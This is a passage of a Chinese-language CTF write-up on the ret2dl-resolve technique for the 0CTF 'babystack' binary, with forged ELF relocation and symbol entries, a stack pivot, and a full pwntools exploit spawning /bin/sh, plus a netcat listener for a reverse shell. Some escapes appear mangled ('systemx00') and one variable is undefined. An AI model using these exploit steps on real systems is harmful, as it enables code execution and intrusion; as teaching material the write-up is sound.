                              --------------------------------------    0x80482c0:    0x0804a014    0x00000407
    reloc-> info = 0x107; reloc-> r_offset = 0x0804a00c
接着
    const ElfW(Sym) *sym = (Elf32_Rel->r_info) >> 8 = 0x1
**第四步**  
`_dl_runtime_resolve`将控制权交给目标函数
## _ret2ret2dl_solve攻击利用
**整体思路:** 从上面知识讲解可以看出来, 给`_dl_runtime_resolve`传进去了两个参数, 我们就是要控制这两个参数,
让系统最终来查找我们自己构造的函数名, 最终实现执行`system("/bin/sh")`
**步骤1: 劫持执行流**  
由于一次输入最多`0x40`个字符, 所以我们需要分两次输入
    offset = 44
    payload  = "A"*44
    payload += p32(0x804843b) #0x804843b 是读取调用读取函数的地址
    payload += p32(ppp_ret)   #pop esi ; pop edi ; pop ebp ; ret
    payload += p32(0)
    payload += p32(bss_stage) # 地址, 存放我们输入的内容, .bss最适合
    payload += p32(100)
**步骤2: 输入构造内容**  
这是`_ret2dl_solve`最复杂的部分, 大家要细细理解
    cmd = "/bin/sh"
    plt_0 = 0x080482f0    # .plt
    ret_plt = 0x080482b0  #.ret.plt --> 及时readelf -r ./babystack显示出的内容
    index_offset = (base_stage + 28) - ret_plt #index_offset 会和 rel_plt相加
    dynsym = 0x080481cc   #.dynsym
    dynstr = 0x0804822c   # .dynstr
    # 保证程序能够正确的解释执行我们构造的内容
    # --------------------------------------------------    fake_sym_addr = base_stage + 36
    align = 0x10 - ((fake_sym_addr - dynsym) & 0xf)
    fake_sym_addr = fake_sym_addr + align
    index_dynsym = (fake_sym_addr - dynsym) / 0x10
    r_info = (index_dynsym << 8) | 0x7
    fake_reloc = p32(read_got) + p32(r_info)
    st_name = (fake_sym_addr + 16) - dynstr
    fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)
    # -----------------------------------------------------    
    payload  = 'AAAA'
    payload += p32(plt_0)
    payload += p32(index_offset)
    payload += 'AAAA'
    payload += p32(base_stage + 80)
    payload += 'a' * 8
    payload += fake_reloc
    payload += align * "B"
    payload += fake_sym
    payload += "systemx00"
    payload += "A" * (80 - len(payload2))
    payload += cmd + 'x00'
    payload += "A"*(100 - len(payload2))
    p.send(payload2)
**步骤3: 第二次劫持执行流**  
第一次劫持是为了让程序输入, 第二次劫持是为了使其跳转到我们精心构造的内容
    payload  = 'A' * (offset)
    payload += p32(pop_ebp_ret)
    payload += p32(base_stage)
    payload += p32(leave_ret)  #mov esp, ebp; pop ebp; ret
**步骤４: 这还不算完(功能未完成)**  
由于比赛做了一些特殊设置, 需要我们使用反弹`shell`才行．这就要我们使用一台有公网`ip`的服务器．  
首先服务器上监听端口：
    nc -l -p 8888 -vvv
执行EXP, 反弹shell至远程服务器, `then cat flag`
## 完整EXP(只能本地，远程未完成)
    from pwn import *
    context.log_level = 'debug'
    elf = ELF('./babystack')
    offset = 44
    read_plt = elf.plt['read']
    read_got = elf.got['read']
    ppp_ret = 0x080484e9
    pop_ebp_ret = 0x080484eb
    leave_ret = 0x080483a8
    stack_size = 0x400
    bss_addr = 0x0804a020
    base_stage = bss_addr + stack_size
    p = process('./babystack')
    # gdb.attach(p)
    payload  = 'A' * offset
    payload += p32(read_plt)
    payload += p32(0x804843B)
    payload += p32(0)
    payload += p32(base_stage)
    payload += p32(200)
    p.send(payload)
    cmd = '/bin/sh'
    plt_0 = 0x080482f0
    ret_plt = 0x080482b0
    index_offset = (base_stage + 28) - ret_plt
    dynsym = 0x080481cc
    dynstr = 0x0804822c
    fake_sym_addr = base_stage + 36
    align = 0x10 - ((fake_sym_addr - dynsym) & 0xf)
    fake_sym_addr = fake_sym_addr + align
    index_dynsym = (fake_sym_addr - dynsym) / 0x10
    r_info = (index_dynsym << 8) | 0x7
    fake_reloc = p32(read_got) + p32(r_info)
    st_name = (fake_sym_addr + 16) - dynstr
    fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)
    payload = 'AAAA'
    payload += p32(plt_0)
    payload += p32(index_offset)
    payload += 'AAAA'
    payload += p32(base_stage + 80)
    payload += 'a' * 8
    payload += fake_reloc
    payload += align * "B"
    payload += fake_sym
    payload += "systemx00"
    payload += "A" * (80 - len(payload))
    payload += cmd + 'x00'
    payload += "A"*(200 - len(payload))
    p.send(payload)
    payload  = 'A' * (offset)
    payload += p32(pop_ebp_ret)
    payload += p32(base_stage)
    payload += p32(leave_ret)  #mov esp, ebp; pop ebp; ret
    p.send(payload)
    p.interactive()
## 总结
**_ret2dl_solve** 攻击方式利用起来不是很困难, 只需改几个参数就可以, 但是完全理解还是需要花点功夫的.
## 参考链接
[XDCTF2015](http://pwn4.fun/2016/11/09/Return-to-dl-resolve/)  
[_dl_runtime_resolve源码](https://code.woboq.org/userspace/glibc/sysdeps/i386/dl-trampoline.S.html)  
[EXP(远程可以用)](http://blog.plusls.cn/ctf/0ctf-2018/pwn/babystack/)